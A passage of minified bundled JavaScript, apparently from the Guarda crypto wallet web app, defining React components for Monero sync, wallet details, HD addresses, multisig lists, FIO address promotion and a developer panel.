          , fL = "xmr_datePickerInput_pAk2P"
          , EL = "xmr_datePickerWrapper_2YIHh"
          , hL = "xmr_datePickerSelectedDay_dHBMZ"
          , gL = "xmr_datePickerCalendar_3Fpm3"
          , yL = "xmr_scanButton_nb2UC"
          , vL = "xmr_infoMessage_gucpG"
          , _L = "xmr_inputLine_3OGD4"
          , wL = "xmr_label_3zzOV"
          , bL = "xmr_scanLabel_254iO";
        function XmrData(e) {
            let {wallet: t, isSyncing: a, syncState: n, lockedBalance: r, setIsLoggedIn: l} = e;
            const [s,i] = (0,
            O.useState)()
              , [o,c] = (0,
            O.useState)("date")
              , [u,d] = (0,
            O.useState)(null)
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)("")
              , h = n.isAddressNotFound ? null : Math.floor(100 * n.blocksScanned / (n.targetBlockHeight - n.startBlockHeight + 1));
            return O.createElement("div", {
                className: dL
            }, O.createElement("div", {
                className: iL
            }, O.createElement("div", {
                className: cL
            }, O.createElement("div", {
                className: uL
            }, "Monero blockchain synchronization is needed in order to get the balance and transaction history.")), O.createElement("div", {
                className: cL
            }, O.createElement("div", {
                className: wL
            }, "Locked balance: ", O.createElement("span", {
                className: oL
            }, r, " XMR"))), O.createElement("div", {
                className: cL
            }, O.createElement(label, {
                className: bL
            }, "date" === o ? "Scan from date" : "Scan from block number"), O.createElement("div", {
                className: _L
            }, O.createElement("div", {
                className: mL
            }, O.createElement(pa, {
                isInvalid: !!f,
                message: f,
                className: pL
            }, "date" === o && O.createElement(Bg.ZP, {
                value: u,
                inputPlaceholder: "Select a day",
                onChange: e => {
                    E("");
                    d(e)
                }
                ,
                inputClassName: fL,
                wrapperClassName: EL,
                calendarSelectedDayClassName: hL,
                calendarClassName: gL,
                colorPrimary: "#7190EB"
            }), "blockNumber" === o && O.createElement(Ea, {
                className: fL,
                placeholder: "00000000",
                type: "number",
                onChange: e => {
                    let {target: {value: t}} = e;
                    E("");
                    i(parseInt(t, 10))
                }
            }))), O.createElement(Yl, {
                color: "blue",
                className: yL,
                onClick: async () => {
                    p("");
                    const e = await Se.Z.getApiByWallet(t)
                      , {error: a} = await e.login({
                        privateKey: t.privateKey,
                        address: t.address,
                        startHeight: "blockNumber" === o ? s : void 0,
                        startTimestamp: "date" === o && u ? Math.floor(new Date(u.year,u.month - 1,u.day).getTime() / 1e3) : void 0
                    });
                    n.isAddressNotFound && l(!0);
                    E(a)
                }
            }, "Scan"), m && O.createElement(ui_message, {
                type: "info",
                className: vL
            }, m)), O.createElement("a", {
                onClick: () => {
                    c("date" === o ? "blockNumber" : "date")
                }
            }, "blockNumber" === o ? "Scan from date" : "Scan from block number")), !n.isAddressNotFound && O.createElement("div", {
                className: cL
            }, O.createElement("div", {
                className: wL
            }, "Actual height (blocks): ", O.createElement("span", {
                className: oL
            }, n.blockchainHeight)), O.createElement("div", {
                className: wL
            }, "Scanning from (blocks): ", O.createElement("span", {
                className: oL
            }, n.startBlockHeight)), O.createElement("div", {
                className: wL
            }, "Status & ETA: ", O.createElement("span", {
                className: oL
            }, O.createElement("span", {
                className: Ht()({
                    [rL]: a
                }, {
                    [lL]: a
                })
            }, h, "%"), " ", !!n.estimatedTimeLeft && O.createElement(O.Fragment, null, "less than ", secondsToDateTime(n.estimatedTimeLeft))))), O.createElement("div", {
                className: cL
            }, O.createElement("div", {
                className: uL
            }, "If your visible balance is not correct, just select earlier date or block height and retry to sync.")), O.createElement("div", {
                className: Ht()(cL)
            }, O.createElement("div", {
                className: eL
            }, O.createElement("a", {
                href: "https://support.guarda.com/assets/why-cant-i-see-my-old-xmr-transactions",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Don't see old transaction?")))))
        }
        const kL = 8e3;
        function XmrDataPanel(e) {
            let {wallet: t} = e;
            const [a,n] = (0,
            O.useState)()
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)()
              , o = (0,
            O.useCallback)((async () => {
                if (null == a || !a.isAddressNotFound || r) {
                    await t.updateBalance();
                    n(t.syncState);
                    i(t.lockedBalance)
                }
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                if ("xmr" !== t.currency)
                    return;
                n(t.syncState);
                i(t.lockedBalance);
                const e = window.setInterval(o, kL);
                return () => {
                    window.clearInterval(e)
                }
            }
            ), [o, t]);
            const c = !!a && a.blocksScanned !== a.targetBlockHeight - a.startBlockHeight + 1;
            return "xmr" === t.currency ? O.createElement(O.Fragment, null, !a && O.createElement("div", {
                className: aL
            }, O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement(loader, {
                visible: c,
                className: aL
            }), (a && s || (null == a ? void 0 : a.isAddressNotFound)) && O.createElement(XmrData, {
                wallet: t,
                isSyncing: c,
                syncState: a,
                lockedBalance: s || "0",
                setIsLoggedIn: l
            })) : null
        }
        const SL = "wallet-information_informationBlock_3SxcN"
          , CL = "wallet-information_informationWrapQR_19MB1"
          , NL = "wallet-information_address_3lv60"
          , TL = "wallet-information_informationWrapAddress_2yy6G"
          , AL = "wallet-information_informationWrapButtons_1qUlL"
          , xL = "wallet-information_desktop_2iBer"
          , IL = "wallet-information_moreInfo_kAQtU"
          , PL = "wallet-information_button_2m2H8"
          , LL = "wallet-information_copyButton_1I5TR styles_dashedNormal_xEvl8"
          , FL = "wallet-information_message_1T9s7"
          , WL = "wallet-information_grayButton_3DEq4"
          , RL = "wallet-information_tagsWrapper_1XAkU"
          , BL = "wallet-information_tagLabel_2cuiR"
          , OL = "wallet-information_fioImageNewTab_spGnP"
          , DL = "wallet-information_lastUpdateTime_gVbKI"
          , ML = "wallet-information_watchOnly_2msU4"
          , UL = "wallet-information_fakeQRCode_3C7kT"
          , GL = "wallet-information_iconExplorer_3TrMn";
        function WalletInformationBlock(e) {
            var t, a;
            const {wallet: n} = e
              , r = (0,
            j.k6)()
              , l = (0,
            $.I0)()
              , s = (0,
            $.v9)(Wo)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(n.uuid)
              , [d,m] = (0,
            O.useState)(!n.isWatchOnly)
              , p = n.accountName || n.address
              , f = null === (t = Se.Z.getRootMetadata(n.currency)) || void 0 === t ? void 0 : t.coin.features;
            function handleShowAddress() {
                m(!0)
            }
            async function handleCreateNormalWallet() {
                return null
            }
            function goToReceive() {
                r.push((0,
                M.RU)(`/receive?wallet=${c}`))
            }
            function goToRequest() {
                r.push({
                    pathname: (0,
                    M.RU)("/fio/invoice-create"),
                    search: objectToString("fio" === n.currency ? {
                        fioWalletFrom: c
                    } : {
                        walletTo: c
                    })
                })
            }
            async function handleChangeWalletUUID() {
                return null
            }
            async function handleRemoveWallet() {
                await l(handleDownload(Sm.BEFORE_REMOVE_WALLET));
                await l(rd.removeWallet(n));
                await l(removeTransactionsByWallet(n))
            }
            function handleGo(e) {
                return function go() {
                    r.push({
                        pathname: `${(0,
                        M.RU)()}/${e}`,
                        search: objectToString({
                            walletFrom: n.uuid
                        })
                    })
                }
            }
            const E = (0,
            be.Au)(n.family, n.currency, p);
            return O.createElement("div", {
                className: SL,
                key: "wallet-information"
            }, n.isWatchOnly && O.createElement("div", {
                className: ML
            }, "This is a Watch Only address"), O.createElement("div", {
                className: CL
            }, d && O.createElement(qr_code, {
                size: 154,
                value: p
            }), !d && O.createElement("div", {
                className: UL,
                onClick: handleShowAddress
            }, "Show address")), O.createElement("div", {
                className: TL
            }, d && O.createElement("div", {
                className: NL
            }, O.createElement(button_copy, {
                text: p
            }, (e => e ? "Address copied to clipboard" : p)), O.createElement("a", {
                href: E,
                target: "_blank",
                rel: "noreferrer noopener",
                className: GL
            }, O.createElement("img", {
                src: Bp,
                alt: "Open block explorer"
            }))), !d && O.createElement("div", {
                className: NL,
                onClick: handleShowAddress
            }, p.replace(/./g, "*"))), O.createElement(_m, {
                wallet: n,
                type: lm
            }), "fio" === n.currency && M.CM && O.createElement("div", {
                className: AL
            }, O.createElement("a", {
                href: `https://reg.fioprotocol.io/ref/guarda?publicKey=${n.address}`,
                target: "_blank",
                rel: "noopener noreferrer"
            }, O.createElement(Yl, {
                size: "small",
                color: "light-blue"
            }, "Get FIO address ", O.createElement("div", {
                className: OL,
                dangerouslySetInnerHTML: {
                    __html: Bp
                }
            }))), !(0,
            M.p1)() && O.createElement(Y.OL, {
                to: `/app/fio/invoice-create?fioWalletFrom=${n.uuid}`
            }, O.createElement(Yl, {
                size: "small",
                color: "light-blue"
            }, "Request"))), !(0,
            M.p1)() && O.createElement("div", {
                className: IL
            }, O.createElement("span", {
                className: "dashedNormal",
                onClick: goToReceive
            }, "More info and all the address formats")), !n.isWatchOnly && O.createElement("div", {
                className: Ht()({
                    [xL]: (0,
                    M.d)()
                }, AL)
            }, !1 !== (null == f ? void 0 : f.isActiveSend) && !(0,
            M.p1)() && !(0,
            M.tq)() && O.createElement(Yl, {
                className: PL,
                color: "light-blue",
                onClick: goToReceive
            }, "Receive"), !1 !== (null == f ? void 0 : f.isActiveSend) && O.createElement(Yl, {
                className: PL,
                color: "light-blue",
                onClick: handleGo("send")
            }, "Send"), !1 !== (null == f ? void 0 : f.isActiveSend) && !(0,
            M.p1)() && O.createElement(Yl, {
                className: PL,
                color: "light-blue",
                onClick: goToRequest
            }, "Request"), !1 !== (null == f ? void 0 : f.isActiveExchange) && O.createElement(Yl, {
                className: PL,
                color: "blue",
                onClick: handleGo("exchange")
            }, "Exchange")), M.CM && O.createElement("div", {
                className: AL
            }, O.createElement("div", {
                className: "dashedNormal",
                onClick: () => o(!i)
            }, "Toggle dev panel")), i && s && s[n.uuid] && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("div", {
                className: DL
            }, "Last update time: ", date_format(null === (a = s[n.uuid]) || void 0 === a ? void 0 : a.updateTime, "dd mmm in HH:MM:ss")), !1))
        }
        const VL = {
            wrapper: "list_wrapper_1FYCk",
            walletContainer: "list_walletContainer_25VJe",
            addressContainer: "list_addressContainer_2mnNK",
            address: "list_address_KY08B",
            addressText: "list_addressText_2tj_l",
            derivePath: "list_derivePath_1IydD",
            walletInfo: "list_walletInfo_2wL0d",
            fiatBalance: "list_fiatBalance_29B6K",
            fiatType: "list_fiatType_UCu8a",
            subWalletsErc20: "list_subWalletsErc20_1Icu7",
            receiveContainer: "list_receiveContainer_bIqZy",
            receiveAddress: "list_receiveAddress_2cNVO",
            receiveWalletInfo: "list_receiveWalletInfo_1S4Sq"
        };
        function HDAddressPanel(e) {
            let {wallet: t, isReceive: a} = e;
            const {convertToFiat: n, isAvailableRate: r} = useConverter();
            return O.createElement("div", {
                className: VL.wrapper
            }, t.subWallets && t.subWallets.map((e => O.createElement("div", {
                key: e.uuid,
                className: Ht()(VL.walletContainer, a && VL.receiveContainer)
            }, O.createElement("div", {
                className: VL.addressContainer
            }, O.createElement("span", {
                className: Ht()(VL.address, a && VL.receiveAddress)
            }, O.createElement(button_copy, {
                text: e.address,
                className: VL.addressText
            }, (t => t ? "Address copied to clipboard" : formatAddress(e.address, 9)))), O.createElement("div", {
                className: VL.derivePath
            }, e.derivePath)), O.createElement("div", {
                className: VL.value
            }, O.createElement("div", {
                className: VL.walletInfo
            }, O.createElement("span", {
                className: Ht()(a && VL.receiveWalletInfo)
            }, (0,
            Ko.yF)(e.balance, 5), " ", O.createElement("span", {
                className: VL.tickerSubWallet
            }, (0,
            be.xG)(e.ticker) || (0,
            be.xG)(t.currency))), r(e) && !e.isCustom ? O.createElement("div", {
                className: VL.fiatBalance
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: n(e.balance, e),
                renderCurrency: !0
            })) : O.createElement("div", {
                className: VL.fiatBalance
            }, "Price is not available")))))))
        }
        const KL = "hd-addresses_wrapper_C3Asu";
        function hd_addresses_HDAddressPanel(e) {
            let {wallet: t} = e;
            return t ? O.createElement("div", {
                className: KL
            }, O.createElement(HDAddressPanel, {
                wallet: t
            })) : null
        }
        const HL = {
            createButton: "multisigs_createButton_3B1Pz",
            walletContainer: "multisigs_walletContainer_2Yzj2",
            addressContainer: "multisigs_addressContainer_3Q51N",
            address: "multisigs_address_2pFQz",
            addressText: "multisigs_addressText_29EEj",
            derivePath: "multisigs_derivePath_23RJ8",
            walletInfo: "multisigs_walletInfo_2PwTi",
            tools: "multisigs_tools_3m_jM",
            fiatBalance: "multisigs_fiatBalance_30Zzj",
            fiatType: "multisigs_fiatType_3-vMG",
            subWalletsErc20: "multisigs_subWalletsErc20_3qlr0",
            description: "multisigs_description_duo9b",
            publicKey: "multisigs_publicKey_2yWQv",
            title: "multisigs_title_iA67U"
        };
        function MultisigsAddressList(e) {
            let {wallet: t} = e;
            const {convertToFiat: a, isAvailableRate: n} = useConverter()
              , r = t.multisigs || [];
            return O.createElement(O.Fragment, null, r.map((e => O.createElement("div", {
                className: HL.walletContainer,
                key: `listuuid${e.uuid}`
            }, O.createElement("div", {
                className: HL.addressContainer
            }, O.createElement("span", {
                className: HL.title
            }, e.title), e.address && O.createElement("span", {
                className: HL.address
            }, O.createElement(button_copy, {
                text: e.address,
                className: HL.addressText
            }, (t => t ? "Address copied to clipboard" : formatAddress(e.address, 5))), O.createElement("span", null, "  (", e.minimumSigAmount, " of ", e.participants.length, ")")), !e.address && O.createElement("span", {
                className: HL.address
            }, "Mining in progress")), O.createElement("div", {
                className: HL.value
            }, O.createElement("div", {
                className: HL.walletInfo
            }, O.createElement("span", null, (0,
            Ko.yF)(e.balance), " ", O.createElement("span", {
                className: HL.tickerSubWallet
            }, (0,
            be.xG)(e.currency))), n(e) || e.isFake ? O.createElement("div", {
                className: HL.fiatBalance
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: a(e.balance, e),
                renderCurrency: !0
            })) : O.createElement("div", {
                className: HL.fiatBalance
            }, "Price is not available")))))))
        }
        function WalletMultisigs(e) {
            let {wallet: t} = e;
            const a = (0,
            O.useContext)(Vt)
              , n = (null == t ? void 0 : t.type) === we.uQ.ETH_LIKE_WALLET || (null == t ? void 0 : t.type) === we.aO.ERC20_TOKEN
              , r = n ? "address" : "Public Key"
              , l = n ? t.address : t.publicKey;
            function openPopupCreateMultisig() {
                a.open("create-multisig", {
                    wallet: t
                })
            }
            return O.createElement("div", {
                className: HL.multisigsBlock,
                key: "wallet-multisigs"
            }, O.createElement(MultisigsAddressList, {
                wallet: t
            }), t.multisigs && 0 === t.multisigs.length && O.createElement("p", {
                className: HL.description
            }, "You don’t have active Multisignature addresses yet. Create one or share your ", r, " with someone who will:"), O.createElement("br", null), O.createElement(label, null, "Your ", r, ":"), O.createElement(button_copy, {
                className: HL.publicKey,
                text: l
            }, (e => e ? `${r} copied to clipboard` : l)), O.createElement("div", {
                className: HL.createButton,
                onClick: openPopupCreateMultisig
            }, "Create multisig"))
        }
        const WalletItemBlock = e => {
            let {style: t, onClick: a, wallet: n, openedWallets: r} = e;
            const l = undefined
              , s = (0,
            $.v9)(selectedNewWallets).includes(n.uuid)
              , i = (0,
            $.v9)(tu)
              , o = (null == i ? void 0 : i.uuid) === (null == n ? void 0 : n.uuid)
              , c = Boolean(null == n ? void 0 : n.multisigId)
              , u = useRenderSubItem({
                wallet: n,
                onClick: a
            });
            return O.createElement("div", {
                style: t,
                className: Ht()(IA, {
                    [PA]: o
                })
            }, O.createElement(wA, {
                wallet: n,
                onClick: a,
                isNew: s,
                isMultisig: c,
                subItem: u()
            }), eA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(SP, {
                wallet: n
            }))), ((0,
            M.p1)() || (0,
            M.tq)()) && ZT === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement(WalletInformationBlock, {
                wallet: n
            })), ((0,
            M.p1)() || (0,
            M.tq)()) && YT === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement(FioAddressDetails, {
                wallet: n
            })), jT === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(GP, {
                wallet: n
            }))), qT === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(TrxResourcesInformation, {
                wallet: n
            }))), aA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(Nx, {
                wallet: n
            }))), QT === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: OA
            }, O.createElement(XmrDataPanel, {
                wallet: n
            }))), nA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(Sx, {
                wallet: n
            }))), oA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(LI, {
                wallet: n
            }))), mA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(XrpSparcAirdrop, {
                wallet: n
            }))), rA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(aI, {
                wallet: n
            }))), lA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(kI, {
                wallet: n
            }))), sA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(_I, {
                wallet: n
            }))), cA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement($x, {
                wallet: n
            }))), dA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(CI, {
                wallet: n
            }))), uA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(eP, {
                wallet: n
            }))), pA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(WalletAddress, {
                wallet: n
            }))), tA === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement("div", {
                className: RA
            }, O.createElement(NeoGasClaim, {
                wallet: n
            }))), XT === r[n.uuid] && O.createElement(hd_addresses_HDAddressPanel, {
                wallet: n
            }), JT === r[n.uuid] && O.createElement("div", {
                className: BA
            }, O.createElement(WalletMultisigs, {
                wallet: n
            })))
        }
        ;
        function WalletsList(e) {
            let {list: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            j.k6)()
              , [r,l] = (0,
            O.useState)({})
              , s = (0,
            O.useCallback)(( (e, t, r) => function onClick(s) {
                s && s.stopPropagation && s.stopPropagation();
                if (e === ZT || e === YT) {
                    (0,
                    M.p1)() || (0,
                    M.tq)() || (r ? n.push((0,
                    M.RU)(`/receive?anchor=${r}`)) : n.push((0,
                    M.RU)("/receive")));
                    a(setActiveWallet(t))
                }
                l((a => {
                    const {uuid: n} = t;
                    return a[n] === e ? {
                        ...a,
                        [n]: ""
                    } : {
                        ...a,
                        [n]: e
                    }
                }
                ))
            }
            ), [a, n]);
            return O.createElement(O.Fragment, null, t.map((e => O.createElement(WalletItemBlock, {
                key: e.uuid + e.currency + e.balance,
                wallet: e,
                onClick: s,
                openedWallets: r
            }))))
        }
        const zL = a.p + "bdec0e4c7a2e34b7cd23b30e8edf3402.svg"
          , jL = "components_wrapperLabel_88OiI"
          , $L = "components_labelCruxState_3_RSD"
          , ZL = "components_cruxLoader_2dWO7"
          , YL = "components_iconWrapperCog_2Fryd"
          , qL = "components_fioIcon_9gK8Q"
          , XL = "components_noWhiteSpace_1Bzui"
          , QL = "components_selfCenter_352GT";
        function LabelFio() {
            const e = undefined
              , t = (0,
            $.v9)(xo).length > 0;
            return O.createElement("div", {
                className: Ht()(gh, jL)
            }, !t && O.createElement(Y.OL, {
                className: kh,
                to: "/app/fio/register-address"
            }, O.createElement("img", {
                src: zL,
                alt: "",
                className: qL
            }), O.createElement("div", {
                className: Ch
            }, O.createElement("h4", null, "FIO addresses"), O.createElement("p", null, "A single address for wallets and easy invoicing.")), O.createElement("div", {
                className: Ht()(XL, QL)
            }, O.createElement(Yl, {
                color: "light-blue",
                size: "small"
            }, "Get address"))), t && O.createElement(Y.OL, {
                className: kh,
                to: "/app/fio/manage"
            }, O.createElement("img", {
                src: zL,
                alt: "",
                className: qL
            }), O.createElement("div", {
                className: Ch
            }, O.createElement("h4", null, "FIO addresses"), O.createElement("p", null, "A single address for wallets and easy invoicing.")), O.createElement("div", {
                className: Ht()(XL, QL)
            }, O.createElement(Yl, {
                color: "light-blue",
                size: "small"
            }, "More info"))))
        }
        const JL = (0,
        j.EN)(LabelFio)
          , eF = "misk-info_wrapper_2YxDq"
          , tF = "misk-info_title_1hjRy"
          , aF = "misk-info_value_2NDS4"
          , nF = "misk-info_isAction_i6wyM"
          , rF = "misk-info_disabled_6OJTF"
          , lF = "misk-info_hightlight_3pKPE";
        function misk_info_extends() {
            misk_info_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return misk_info_extends.apply(this, arguments)
        }
        const sF = undefined
          , MiskInfoTitle = e => {
            let {children: t, ...a} = e;
            return O.createElement("div", misk_info_extends({
                className: tF
            }, a), t)
        }
          , MiskInfoValue = e => {
            let {hightlight: t, children: a, disabled: n, onClick: r, ...l} = e;
            return O.createElement("div", misk_info_extends({
                className: Ht()(aF, {
                    [nF]: !!r,
                    [rF]: n,
                    [lF]: t
                }),
                onClick: r
            }, l), n ? O.createElement(LoaderDots, {
                visible: !0
            }) : a)
        }
          , misk_info = e => {
            let {children: t, className: a} = e;
            return O.createElement("div", {
                className: Ht()(eF, a)
            }, t)
        }
        ;
        var iF = a(32790);
        const DevPanel = () => {
            const e = (0,
            $.I0)()
              , handleRemoveAllTxs = () => {
                e(gc())
            }
              , handleRemoveRates = () => {
                e((0,
                iF.W0)())
            }
            ;
            return O.createElement("div", {
                className: gh
            }, O.createElement("h4", {
                className: yh
            }, "Only for development"), O.createElement("div", {
                className: Ph
            }, O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Pending txs:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, (0,
            $.v9)(selectedPendingTxs).length)), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Exchange txs:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, (0,
            $.v9)(selectedExchangeTxs).length)), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Buy txs:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, (0,
            $.v9)(selectedBuyTxs).length)), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Sell txs:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, (0,
            $.v9)(selectedSellTxs).length)), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "All txs:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, (0,
            $.v9)(Eu).length)), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Wallets:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, (0,
            $.v9)($c).length)), O.createElement(label, null, "Tools"), O.createElement("a", {
                onClick: handleRemoveAllTxs
            }, "Remove all transactions"), O.createElement("br", null), O.createElement("br", null), O.createElement("a", {
                onClick: handleRemoveRates
            }, "Remove all rates"), O.createElement("br", null), O.createElement("br", null), O.createElement(Y.OL, {
                to: "/app/settings/decode"
            }, "Decode backup"), O.createElement("br", null), O.createElement("br", null), O.createElement("br", null), O.createElement(label, null, "LS url params"), bu.NI.map((e => O.createElement(misk_info, {
                key: `dev-panel-${e}`
            }, O.createElement(MiskInfoTitle, null, e, ":"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, (0,
            bu.Pt)(e) || "false"))))))
        }
          , oF = DevPanel;
        function ExtraBlocks() {
            return (0,
            M.U_)() ? (0,
            M.d)() ? O.createElement(O.Fragment, null, O.createElement(JL, null)) : O.createElement(O.Fragment, null, O.createElement(JL, null), M.CM && O.createElement(oF, null)) : null
        }
        const cF = "empty-backup_addWalletItem_39KWw"
          , uF = "empty-backup_walletItem_3Adqy"
          , dF = "empty-backup_addTokenItem_1xzpx"
          , mF = "empty-backup_addIconCurrency_2jhm3"
          , pF = "empty-backup_title_3GEV3"
          , fF = "empty-backup_ticker_3zNEO"
          , EF = "empty-backup_button_3YSLq";
        function EmptyBackup() {
            const e = ["btc", "bnb", "eth", "xrp"]
              , {createWallet: t} = use_create_wallet_useCreateWallet();
            return O.createElement(O.Fragment, null, e.map((e => {
                var a, n, r;
                return O.createElement("div", {
                    key: e,
                    className: cF
                }, O.createElement(IconCurrency, {
                    currency: e,
                    className: mF,
                    isHidden: !0
                }), O.createElement("div", {
                    className: uF
                }, O.createElement("div", {
                    className: pF
                }, null === (a = (0,
                be.II)(e)) || void 0 === a ? void 0 : a.title, O.createElement("div", {
                    className: fF
                }, null === (n = (0,
                be.II)(e)) || void 0 === n || null === (r = n.ticker) || void 0 === r ? void 0 : r.toUpperCase())), O.createElement(Yl, {
                    color: "blue",
                    onClick: () => t({
                        currency: e
                    }),
                    className: EF
                }, "Add")))
            }
            )))
        }
        const hF = EmptyBackup
          , gF = a.p + "c4a6304c72365c190436c327c473e7da.svg";
        function AllHidden(e) {
            let {list: t} = e;
            const getTickersString = e => {
                const t = 19
                  , a = ", ";
                let n = 0
                  , r = 0;
                for (; n < t; ) {
                    n += e[r].currency.length + a.length;
                    n < t && r++
                }
                return e.slice(0, r).map((e => e.currency)).join(", ").toUpperCase()
            }
            ;
            function getTickers() {
                return 0 === t.length ? "" : 1 === t.length ? `${t[0].currency.toUpperCase()} wallet` : 2 === t.length ? `${t[0].currency.toUpperCase()}, ${t[1].currency.toUpperCase()} wallets` : `${getTickersString(t)} & more`
            }
            return O.createElement("div", {
                className: ST
            }, O.createElement("div", {
                className: CT
            }, O.createElement("img", {
                src: gF,
                alt: "All hidden"
            })), O.createElement("div", {
                className: NT
            }, O.createElement("div", null, O.createElement("p", null, "Wallets are hidden (by filters)"), getTickers()), O.createElement(Y.OL, {
                to: "/app/wallet-management"
            }, O.createElement("div", {
                className: TT
            }, "Settings"))))
        }
        const yF = AllHidden
          , vF = "new-available-token_walletInfo_2CcaP"
          , _F = "new-available-token_titleWallet_3--ul"
          , wF = "new-available-token_titleWrapper_v-37E"
          , bF = "new-available-token_tickerWallet_2xEwI"
          , kF = "new-available-token_iconCurrency_1rdqg"
          , SF = "new-available-token_walletBlock_30bim"
          , CF = "new-available-token_isActive_1vsiH"
          , NF = "new-available-token_addTokenItemWrapper_3ReFn"
          , TF = undefined
          , new_available_token = e => {
            let {className: t, token: a, onClick: n} = e;
            const r = (0,
            be.II)(a.family)
              , l = undefined
              , s = (0,
            $.v9)((e => e.wallets.activeWalletId)) === calculateFakeTokenUuid(a)
              , {isSpamToken: i} = useSpamAndUnknownToken({
                ...a,
                onlySpamToken: !0
            })
              , handleClick = e => {
                n(e, a)
            }
            ;
            return O.createElement("div", {
                className: Ht()(t, NF, SF, {
                    [CF]: s
                }),
                onClick: handleClick
            }, O.createElement(IconCurrency, {
                currency: a.currency,
                className: kF
            }), i && O.createElement(SpamTokenNotify_SpamTokenNotify, {
                family: a.family
            }), O.createElement("div", {
                className: vF
            }, O.createElement("div", {
                className: _F
            }, O.createElement("div", {
                className: wF
            }, a.title || (0,
            be.xG)(a.ticker) || (0,
            be.xG)(a.currency)), O.createElement("span", {
                className: bF
            }, (0,
            be.xG)(a.ticker) || (0,
            be.xG)(a.currency))), O.createElement(yA, {
                wallet: r
            })))
        }
          , AF = "new-available-coin_iconCurrency_1xbqN"
          , xF = "new-available-coin_walletBlock_3D8dc"
          , IF = "new-available-coin_isActive_1m94P"
          , PF = "new-available-coin_wrapperBeforeCurrency_3l9e1"
          , LF = "new-available-coin_walletInfo_3lthO"
          , FF = "new-available-coin_titleWallet_i1Orv"
          , WF = "new-available-coin_titleWrapper_jpjZe"
          , RF = "new-available-coin_tickerWallet_VOsRJ"
          , BF = "new-available-coin_addCoinItemWrapper_1QoTh"
          , OF = "new-available-coin_isMultisig_1zoul";
        function NewAvailableCoinBlock(e) {
            let {className: t, wallet: a, onClick: n, isMultisig: r} = e;
            const l = `${(0,
            be.xG)(a.currency)} wallet`
              , s = undefined
              , i = (0,
            $.v9)((e => e.wallets.activeWalletId)) === (null == a ? void 0 : a.title)
              , renderCurrencyTicker = () => {
                const e = (0,
                be.xG)(a.currency);
                return e && e.length > 5 ? `${e.slice(0, 5)}...` : e
            }
              , handleClick = e => {
                n(e, a)
            }
            ;
            return O.createElement("div", {
                className: Ht()(t, BF, xF, {
                    [IF]: i
                }),
                onClick: handleClick
            }, O.createElement(IconCurrency, {
                currency: a.currency,
                className: AF
            }), O.createElement("div", {
                className: PF
            }, O.createElement("div", {
                className: LF
            }, O.createElement("div", {
                className: FF
            }, O.createElement("div", {
                className: WF
            }, a.title || l, O.createElement("span", {
                className: RF
            }, renderCurrencyTicker()), r && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("div", {
                className: OF
            }, "Multisig")))))))
        }
        const DF = NewAvailableCoinBlock
          , MF = 5
          , UF = 10;
        function DashboardWallets() {
            const [e,t] = (0,
            O.useState)("")
              , [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)(5)
              , [s,i] = (0,
            O.useState)(5)
              , o = (0,
            O.useMemo)(( () => debounce(t, 300)), [t])
              , c = (0,
            O.useRef)(null)
              , u = (0,
            $.v9)(oe.s$)
              , d = (0,
            $.v9)(ws)
              , m = (0,
            $.v9)(bs)
              , p = (0,
            $.v9)(ks)
              , {defaultWalletsFilter: f, requiredFilter: E} = use_default_wallets_filter()
